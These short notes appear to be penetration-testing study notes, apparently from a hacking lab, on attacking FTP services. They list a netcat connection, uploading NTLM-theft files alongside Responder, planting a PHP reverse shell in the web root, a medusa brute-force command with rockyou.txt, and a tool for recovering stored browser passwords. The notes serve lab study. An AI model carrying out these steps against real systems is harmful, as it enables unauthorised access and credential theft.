```
nc [target IP] [port]
```


Check to see if we have upload functionality
Can try to upload malicious files 
- set up responder
- upload ntlm_theft.py 


If there is a web server
Check if FTP maps to web root:
- /var/www/html
- /srv/ftp
We can upload a web shell e.g.
```
cp /usr/share/webshells/php/php-reverse-shell.php shell.php
```
Navigate to it in web browser and get shell

Brute Forcing 
```
medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp
```

To find password in ftp
[https://github.com/lclevy/firepwd](https://github.com/lclevy/firepwd)